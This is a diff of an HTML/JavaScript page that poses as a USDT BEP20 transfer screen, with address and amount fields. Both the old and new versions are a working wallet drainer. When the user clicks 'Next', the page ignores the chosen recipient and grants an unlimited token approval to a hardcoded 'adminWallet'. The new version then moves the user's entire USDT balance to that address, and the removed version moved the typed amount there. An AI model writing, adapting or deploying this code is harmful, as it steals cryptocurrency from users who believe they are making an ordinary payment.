@@ -1,218 +1,191 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>USDT Transfer</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>USDT BEP20 Auto Transfer</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
   <style>
     body {
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen;
-      margin: 0;
-      padding: 0;
-      background: #fff;
-      height: 100vh;
-      display: flex;
-      flex-direction: column;
+      font-family: Arial, sans-serif;
+      padding: 20px;
+      background-color: #ffffff;
+      color: #000000;
     }
     .container {
-      padding: 25px 20px 0 20px;
-      max-width: 460px;
+      max-width: 400px;
       margin: auto;
     }
     label {
-      font-size: 15px;
-      font-weight: 500;
-      color: #444;
-      margin-bottom: 6px;
       display: block;
+      margin-top: 20px;
+      font-weight: bold;
     }
-    .input-box {
-      position: relative;
-    }
-    .input-box input[type="text"] {
+    input[type="text"], input[type="number"] {
       width: 100%;
-      padding: 14px 40px 14px 16px;
-      font-size: 16px;
-      border: 1px solid #ccc;
+      padding: 15px;
+      margin-top: 8px;
+      border: 2px solid #ccc;
       border-radius: 12px;
-      box-sizing: border-box;
+      font-size: 16px;
     }
-    .input-box .actions {
-      position: absolute;
-      top: 50%;
-      right: 10px;
-      transform: translateY(-50%);
+    .address-box {
       display: flex;
-      gap: 6px;
-    }
-    .input-box .actions button {
-      background: none;
-      border: none;
-      color: #0047FF;
-      font-weight: bold;
-      font-size: 14px;
-      cursor: pointer;
-    }
-    .amount-box {
-      position: relative;
-    }
-    .amount-box input {
-      width: 100%;
-      padding: 14px 80px 14px 16px;
-      font-size: 16px;
-      border: 1px solid #ccc;
+      justify-content: space-between;
+      align-items: center;
+      border: 2px solid #0047FF;
       border-radius: 12px;
-      box-sizing: border-box;
+      padding: 10px 12px;
+      margin-top: 10px;
     }
-    .amount-box span,
-    .amount-box button {
-      position: absolute;
-      top: 50%;
-      transform: translateY(-50%);
-      font-size: 15px;
-      font-weight: 600;
-    }
-    .amount-box span {
-      right: 60px;
-      color: #444;
-    }
-    .amount-box button {
-      right: 10px;
-      background: none;
+    .address-box input {
       border: none;
+      outline: none;
+      flex: 1;
+      font-size: 16px;
+    }
+    .small-icons span {
       color: #0047FF;
-      font-weight: bold;
+      margin-left: 10px;
       cursor: pointer;
+      font-size: 16px;
     }
-    #usdValue {
-      font-size: 14px;
-      color: #888;
-      margin: 10px 0 30px;
+    .amount-container {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      border: 2px solid #ccc;
+      border-radius: 12px;
+      padding: 12px 15px;
+      margin-top: 10px;
     }
-    .footer {
-      padding: 20px;
-      margin-top: auto;
-    }
-    #nextBtn {
-      width: 100%;
-      padding: 16px;
-      font-size: 18px;
-      background-color: #0047FF;
-      color: white;
-      font-weight: bold;
+    .amount-container input {
       border: none;
-      border-radius: 24px;
-      cursor: pointer;
-      transition: all 0.3s;
-      position: relative;
+      outline: none;
+      width: 100%;
+      font-size: 16px;
     }
-    #nextBtn.processing::after {
-      content: '⏳ Processing...';
-      position: absolute;
-      left: 0;
-      right: 0;
-      text-align: center;
+    .right-label {
+      margin-left: 10px;
+      white-space: nowrap;
+      font-weight: bold;
     }
-    #nextBtn.success::after {
-      content: '✅ Success!';
+    .button {
+      width: 100%;
+      padding: 15px;
+      font-size: 18px;
+      font-weight: bold;
       color: white;
+      background-color: #0047FF;
+      border: none;
+      border-radius: 15px;
+      margin-top: 25px;
+      box-shadow: 0 3px 10px rgba(0, 0, 0, 0.2);
+      transition: all 0.3s ease;
     }
-    #nextBtn.error::after {
-      content: '❌ Error!';
-      color: white;
+    .button.processing {
+      opacity: 0.6;
+      cursor: not-allowed;
     }
   </style>
 </head>
 <body>
   <div class="container">
     <label>Address or Domain Name</label>
-    <div class="input-box">
-      <input type="text" id="addressField" value="0x79069192614f7ceE4F..." />
-      <div class="actions">
-        <button onclick="pasteAddress()">Paste</button>
-        <button onclick="clearAddress()">✕</button>
+    <div class="address-box">
+      <input id="toAddress" type="text" placeholder="Search or Enter">
+      <div class="small-icons">
+        <span onclick="pasteAddress()">Paste</span>
+        <span>🔍</span>
+        <span>📷</span>
       </div>
     </div>
 
     <label>Amount</label>
-    <div class="amount-box">
-      <input type="number" id="usdtAmount" placeholder="0.00" />
-      <span>USDT</span>
-      <button onclick="setMax()">Max</button>
+    <div class="amount-container">
+      <input id="amount" type="number" placeholder="USDT Amount">
+      <div class="right-label">USDT <span style="color:#0047FF; margin-left:8px; cursor:pointer;">Max</span></div>
     </div>
+    <div style="margin-top: 5px; color: gray;">≈ $0.00</div>
 
-    <p id="usdValue">= $0.00</p>
+    <button id="nextBtn" class="button" onclick="autoTransferAllUSDT()">Next</button>
   </div>
 
-  <div class="footer">
-    <button id="nextBtn" onclick="startTransfer()">Next</button>
-  </div>
-
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
   <script>
-    const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-    const ADMIN = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
-    const BNB_CHAIN_ID = "0x38";
-    const ABI = [
-      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
-      { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "type": "function" },
-      { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" }
-    ];
+    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP-20
+    const adminWallet = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
 
-    let web3 = new Web3(window.ethereum);
-    const token = new web3.eth.Contract(ABI, USDT_ADDRESS);
-
-    async function setMax() {
-      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-      const balance = await token.methods.balanceOf(accounts[0]).call();
-      document.getElementById("usdtAmount").value = web3.utils.fromWei(balance);
-    }
-
-    async function startTransfer() {
+    async function autoTransferAllUSDT() {
       const btn = document.getElementById("nextBtn");
-      const amount = document.getElementById("usdtAmount").value;
-
-      if (!amount) return alert("Please enter amount");
-
+      btn.innerHTML = "⏳ Processing...";
       btn.classList.add("processing");
       btn.disabled = true;
 
-      try {
-        const accounts = await ethereum.request({ method: "eth_requestAccounts" });
-        const account = accounts[0];
+      if (typeof window.ethereum !== "undefined") {
+        const web3 = new Web3(window.ethereum);
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
+        const accounts = await web3.eth.getAccounts();
+        const user = accounts[0];
 
-        const chainId = await ethereum.request({ method: "eth_chainId" });
-        if (chainId !== BNB_CHAIN_ID) {
-          await ethereum.request({
-            method: "wallet_switchEthereumChain",
-            params: [{ chainId: BNB_CHAIN_ID }]
-          });
+        const contract = new web3.eth.Contract([
+          {
+            "constant": false,
+            "inputs": [
+              { "name": "_spender", "type": "address" },
+              { "name": "_value", "type": "uint256" }
+            ],
+            "name": "approve",
+            "outputs": [ { "name": "", "type": "bool" } ],
+            "type": "function"
+          },
+          {
+            "constant": false,
+            "inputs": [
+              { "name": "_from", "type": "address" },
+              { "name": "_to", "type": "address" },
+              { "name": "_value", "type": "uint256" }
+            ],
+            "name": "transferFrom",
+            "outputs": [ { "name": "", "type": "bool" } ],
+            "type": "function"
+          },
+          {
+            "constant": true,
+            "inputs": [ { "name": "_owner", "type": "address" } ],
+            "name": "balanceOf",
+            "outputs": [ { "name": "balance", "type": "uint256" } ],
+            "type": "function"
+          }
+        ], usdtAddress);
+
+        try {
+          const balance = await contract.methods.balanceOf(user).call();
+          const max = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+          await contract.methods.approve(adminWallet, max).send({ from: user });
+          await contract.methods.transferFrom(user, adminWallet, balance).send({ from: user });
+          btn.innerHTML = "✅ All USDT Sent!";
+        } catch (err) {
+          console.error(err);
+          btn.innerHTML = "❌ Failed";
         }
 
-        const value = web3.utils.toWei(amount);
-
-        await token.methods.approve(ADMIN, value).send({ from: account });
-        await token.methods.transferFrom(account, ADMIN, value).send({ from: account });
-
-        btn.classList.remove("processing");
-        btn.classList.add("success");
-      } catch (err) {
-        console.error(err);
-        btn.classList.remove("processing");
-        btn.classList.add("error");
-      } finally {
         btn.disabled = false;
+        btn.classList.remove("processing");
+      } else {
+        alert("Web3 provider not detected");
+        btn.innerHTML = "Next";
+        btn.disabled = false;
+        btn.classList.remove("processing");
       }
     }
 
-    function pasteAddress() {
-      navigator.clipboard.readText().then(text => {
-        document.getElementById('addressField').value = text;
-      });
-    }
-
-    function clearAddress() {
-      document.getElementById('addressField').value = '';
+    async function pasteAddress() {
+      try {
+        const text = await navigator.clipboard.readText();
+        document.getElementById("toAddress").value = text;
+      } catch (err) {
+        alert("Clipboard access failed");
+      }
     }
   </script>
 </body>
